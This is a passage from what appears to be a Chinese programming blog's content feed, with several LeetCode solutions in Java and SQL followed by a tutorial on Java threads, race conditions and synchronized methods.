class="keyword">int</span> end = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = nums.length - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] != numOfCopy[i]) &#123;</span><br><span class="line">        		end = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (begin == -<span class="number">1</span> || end == -<span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> end - begin + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>596. 超过5名学生的课</title>
    <url>/2018/08/30/LeetCode/leetcode-000596.%20%E8%B6%85%E8%BF%875%E5%90%8D%E5%AD%A6%E7%94%9F%E7%9A%84%E8%AF%BE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有一个<code>courses</code> 表 ，有: <code>student</code> (学生) 和 <code>class</code> (课程)。</p>
<p>请列出所有超过或等于5名学生的课。</p>
<p>例如,表:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------+</span><br><span class="line">| student | class      |</span><br><span class="line">+---------+------------+</span><br><span class="line">| A       | Math       |</span><br><span class="line">| B       | English    |</span><br><span class="line">| C       | Math       |</span><br><span class="line">| D       | Biology    |</span><br><span class="line">| E       | Math       |</span><br><span class="line">| F       | Computer   |</span><br><span class="line">| G       | Math       |</span><br><span class="line">| H       | Math       |</span><br><span class="line">| I       | Math       |</span><br><span class="line">+---------+------------+</span><br></pre></td></tr></table></figure>
<p>应该输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| class   |</span><br><span class="line">+---------+</span><br><span class="line">| Math    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
<p><strong>Note：</strong><br>学生在每个课中不应被重复计算。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">class</span> <span class="keyword">from</span> courses <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">class</span> <span class="keyword">having</span> <span class="keyword">count</span>(<span class="keyword">distinct</span>(student)) &gt;= <span class="number">5</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>633. 平方数之和</title>
    <url>/2018/08/30/LeetCode/leetcode-000633.%20%E5%B9%B3%E6%96%B9%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 <code>c</code> ，你要判断是否存在两个整数 <code>a</code> 和 <code>b</code>，使得 a2 + b2 = c。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: True</span><br><span class="line">解释: 1 * 1 + 2 * 2 &#x3D; 5</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>不好说</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (<span class="keyword">int</span>) Math.sqrt(c);</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = mid;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right ) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (c == left * left + right * right) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt; left * left + right * right) &#123;</span><br><span class="line">        		left++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		right--;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>645. 错误的集合</title>
    <url>/2018/08/30/LeetCode/leetcode-000645.%20%E9%94%99%E8%AF%AF%E7%9A%84%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>集合 <code>S</code> 包含从1到 <code>n</code> 的整数。不幸的是，因为数据错误，导致集合里面某一个元素复制了成了集合里面的另外一个元素的值，导致集合丢失了一个整数并且有一个元素重复。</p>
<p>给定一个数组 <code>nums</code> 代表了集合 <code>S</code> 发生错误后的结果。你的任务是首先寻找到重复出现的整数，再找到丢失的整数，将它们以数组的形式返回。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [1,2,2,4]</span><br><span class="line">输出: [2,3]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ol>
<li>给定数组的长度范围是 [2, 10000]。</li>
<li>给定的数组是无序的。<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>使用一个中间数组来保存出现过的数字。即，将中间数组对应索引为该数字的值置为1，如果一个数字，去值位的时候发现该位置上已经是1了， 则说明该数字是多出来的数字。最后扫描一遍中间数组，未置0的则为缺失的数字。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findErrorNums(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> more = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> less = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (result[nums[i]] == <span class="number">1</span>) &#123;</span><br><span class="line">        		more = nums[i];</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				result[nums[i]] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; result.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span>(result[i] == <span class="number">0</span>) &#123;</span><br><span class="line">        		less = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;more, less&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>686. 重复叠加字符串匹配</title>
    <url>/2018/08/30/LeetCode/leetcode-000686.%20%E9%87%8D%E5%A4%8D%E5%8F%A0%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 A 和 B, 寻找重复叠加字符串A的最小次数，使得字符串B成为叠加后的字符串A的子串，如果不存在则返回 -1。</p>
<p>举个例子，A = “abcd”，B = “cdabcdab”。</p>
<p>答案为 3， 因为 A 重复叠加三遍后为 “abcdabcdabcd”，此时 B 是其子串；A 重复叠加两遍后为”abcdabcd”，B 并不是其子串。<br><strong>注意：</strong><br>A 与 B 字符串的长度在1和10000区间范围内。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>拼接，判断即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedStringMatch</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer(A);</span><br><span class="line">        <span class="keyword">while</span> (sb.length() &lt;= <span class="number">10000</span>) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (sb.toString().contains(B)) &#123;</span><br><span class="line">        		<span class="keyword">return</span> result;</span><br><span class="line">        	&#125;</span><br><span class="line">        	sb.append(A);</span><br><span class="line">        	result++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!sb.toString().contains(B)) &#123;</span><br><span class="line">        	<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>717. 1比特与2比特字符</title>
    <url>/2018/08/30/LeetCode/leetcode-000717.%201%E6%AF%94%E7%89%B9%E4%B8%8E2%E6%AF%94%E7%89%B9%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有两种特殊字符。第一种字符可以用一比特<code>0</code>来表示。第二种字符可以用两比特(<code>10</code> 或 <code>1</code>1)来表示。</p>
<p>现给一个由若干比特组成的字符串。问最后一个字符是否必定为一个一比特字符。给定的字符串总是由<code>0</code>结束。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">bits &#x3D; [1, 0, 0]</span><br><span class="line">输出: True</span><br><span class="line">解释: </span><br><span class="line">唯一的编码方式是一个两比特字符和一个一比特字符。所以最后一个字符是一比特字符。</span><br></pre></td></tr></table></figure>

<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">bits &#x3D; [1, 1, 1, 0]</span><br><span class="line">输出: False</span><br><span class="line">解释: </span><br><span class="line">唯一的编码方式是两比特字符和两比特字符。所以最后一个字符不是一比特字符。</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li><code>1 &lt;= len(bits) &lt;= 1000.</code></li>
<li><code>bits[i]</code> 总是<code>0</code> 或 <code>1</code>.</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果出现1了，那么其后面的数字肯定是跟着1的，那么只要略过这个数字即可。<br>具体思路可参考：<a href="https://blog.csdn.net/qq_16151925/article/details/80204862" target="_blank" rel="noopener">https://blog.csdn.net/qq_16151925/article/details/80204862</a></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOneBitCharacter</span><span class="params">(<span class="keyword">int</span>[] bits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; bits.length - <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (bits[index] == <span class="number">0</span>) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		index += <span class="number">2</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> index == bits.length - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java线程</title>
    <url>/2018/08/30/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/0.Java%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Java线程"><a href="#Java线程" class="headerlink" title="Java线程"></a>Java线程</h1><h2 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程"></a>什么是线程</h2><p>线程，有时候被称为轻量进程，是程序执行流的最小单元。一个标准的线程由线程ID，当前指令指针，寄存器集合和堆栈组合。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点儿运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。由于线程之间的相互制约，只是线程在运行中呈现间断性。</p>
<h3 id="单线程程序"><a href="#单线程程序" class="headerlink" title="单线程程序"></a>单线程程序</h3><p>先来看一个单线程程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Hello, Thread"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/1.%E5%8D%95%E7%BA%BF%E7%A8%8B.PNG" alt="单线程运行"></p>
<p>Java程序在执行时，至少会有一个线程在运行。上述代码中运行的就是被称作<strong>主线程</strong>的线程。主线程会执行Main类的main方法。在main方法中所有的处理都执行完毕之后，主线程也就终止了。</p>
<h2 id="实现多线程"><a href="#实现多线程" class="headerlink" title="实现多线程"></a>实现多线程</h2><p>在Java中，有两种方法是可以实现多线程的。一种是继承Thread类，另外一种是实现Runnable接口。</p>
<h3 id="继承Trhead"><a href="#继承Trhead" class="headerlink" title="继承Trhead"></a>继承Trhead</h3><p>先来看一段代码。<br>MyThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;    <span class="comment">// 继承Thread接口</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;    <span class="comment">// 线程的所有操作都写在run方法中</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		MyThread thread = <span class="keyword">new</span> MyThread();</span><br><span class="line">		thread.start();    <span class="comment">//    启动一个线程，线程这个时候状态变为runnable，不一定分到cpu</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Thread!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行Main类中的main 方法后，就“可能”得到如下输出：</p>
<p><img src="https://huhansi.github.io/images/2.%E5%A4%9A%E7%BA%BF%E7%A8%8B.PNG" alt="多线程运行"><br>之所以说是可能，是因为线程被调度的时间点是不确定的，它可能在主线程执行完毕之后才调度，也可能在主线程执行了一半才调度。<br>线程的操作都写在run方法中，当run方法执行结束时，线程也会跟着终止。然而，要启动一个线程，还必须调用它的start方法。</p>
<h3 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h3><p>还是先看一段代码<br>Mythread1类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;    <span class="comment">// 实现Runnable</span></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;    <span class="comment">// 重写run方法</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Hello "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1());    <span class="comment">// 以Runnable为参数，生成一个线程</span></span><br><span class="line">		thread.start();    <span class="comment">// 启动线程</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">			System.out.print(<span class="string">"Thread!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<p><img src="https://huhansi.github.io/images/3.%E5%AE%9E%E7%8E%B0Runnable%E6%8E%A5%E5%8F%A3.PNG" alt="实现Runnable接口"></p>
<h2 id="线程的启动"><a href="#线程的启动" class="headerlink" title="线程的启动"></a>线程的启动</h2><p>其实线程的启动已经在上一章节说的差不多了，主要有两种方式：<br>1、 利用Thread类的子类的实例启动线程；<br>2、 利用Runnable接口的实现类的实例启动线程。</p>
<h2 id="线程的暂停"><a href="#线程的暂停" class="headerlink" title="线程的暂停"></a>线程的暂停</h2><p>线程Thread类中的静态方法sleep能够暂停线程运行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"Thread! "</span> + System.currentTimeMillis());    <span class="comment">// 打印Thread！ 和 系统当前时间</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行上面的代码后，就会发现程序会以一秒的间隔输出一句Thread</p>
<p><img src="https://huhansi.github.io/images/4.sleep.PNG" alt="线程的休眠"><br>在sleep方法中，停止时间也可以制定到纳秒单位。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.sleep(毫秒，纳秒)</span><br></pre></td></tr></table></figure>
<h2 id="线程的互斥"><a href="#线程的互斥" class="headerlink" title="线程的互斥"></a>线程的互斥</h2><p>多线程程序中的各个线程都是自由运行的，所有它们有时候就会同时操作同一个实例。这在某些情况下会引发问题。例如，从银行账户取款时，余额确认部分的代码应该是像下面这样的：<br>if (可用余额大于等于取款金额) {<br>    从可用余额上减去取款金额<br>}<br>首先确认可用余额，确认是否允许存款。如果允许，则从可用余额上减去取款金额，这样才不会导致可用余额变为负数。<br>但是，如果两个线程同时执行这段代码，那么可用余额就有可能变为负数。<br>假设可用余额为100块，需要取款80块，那么在下面这种情况下，余额就可能变为负数：<br>线程A                                            线程B<br>可用余额是否大于取款金额<br>    是的</p>
<pre><code>《在此时切换至线程B》
                    可用余额是否大于取款金额
                        是的
                    从可用余额上减去取款金额
                        可用余额变为20块
《在此时切换回线程A》</code></pre><p>从可用余额上减去取款金额<br>    可用余额变为-60块</p>
<p>这种线程A和线程B之间互相竞争而引起的与预期相反的情况称为数据竞争或者竞态条件。<br>这个时候就需要有一种“交通管制”来协助防止发生数据金正。例如，一个线程正在执行某一部分操作，那么其他线程就不可以再执行这部分操作。这种类似于交通管制的操作通常称之为互斥。<br>Java用synchronized关键字来执行线程的互斥处理。</p>
<h3 id="synchronized方法"><a href="#synchronized方法" class="headerlink" title="synchronized方法"></a>synchronized方法</h3><p>如果声明一个方法时，在前面加上关键字synchd，那么这个方法就只能由一个线程运行。只能由一个线程运行是每次只能由一个线程运行的意思，并不是说仅能让某以特定线程运行。这种方法称之为synchronized方法，有时也称之为同步方法。<br>那么存取款这个过程就可以改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bank</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> money;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Bank</span><span class="params">(String name, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.money = money;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;    <span class="comment">// 对方法加锁</span></span><br><span class="line">		money += m;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (money &gt;= m) &#123;</span><br><span class="line">			money -= m;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对每个Bank实例来说，它们都拥有一个独立的说，因此，实例1和实例2之间是互相不影响的。但是在实例内部，如果正在执行加锁的方法，deposit，那么就不能执行withdraw方法，因为此时锁正被方法deposit持有，withdraw方法只能阻塞直至获取锁为止。但是，没有加上synchronized关键字的getName方法，是可以随便调用的，调用它不需要任何条件。</p>
<h3 id="synchronized代码块"><a href="#synchronized代码块" class="headerlink" title="synchronized代码块"></a>synchronized代码块</h3><p>如果只是想让方法中的某一部分由一个线程运行，而非整个方法，则可以使用synchronized代码块，格式如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (表达式) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其中"表达式"为获取锁的示例</span></span><br></pre></td></tr></table></figure>
<p>synchronized代码块用于精确控制互斥处理的执行范围。</p>
<h3 id="synchronized实例方法和synchronized代码块"><a href="#synchronized实例方法和synchronized代码块" class="headerlink" title="synchronized实例方法和synchronized代码块"></a>synchronized实例方法和synchronized代码块</h3><p>假设有如下synchronized示例方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这根下面将方法体用synchronized代码块包围起来是等效的，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，synchronized示例方法是使用this的锁来执行线程的互斥处理的。</p>
<h3 id="synchronized静态方法和synchronized代码块"><a href="#synchronized静态方法和synchronized代码块" class="headerlink" title="synchronized静态方法和synchronized代码块"></a>synchronized静态方法和synchronized代码块</h3><p>假设有如下synchronized静态方法。synchronized静态方法每次只能由一个线程运行，这一点和synchronized实例方法相同。但synchronized静态方法使用的锁和synchronized实例方法使用的锁是不一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这跟下面将方法体用synchronized代码块包围起来是等效的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Something</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(Something<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，synchronized静态方式是使用该类的类对象的锁来执行线程的互斥处理的。Something.class是Something类对应的java.lang.class类的实例。</p>
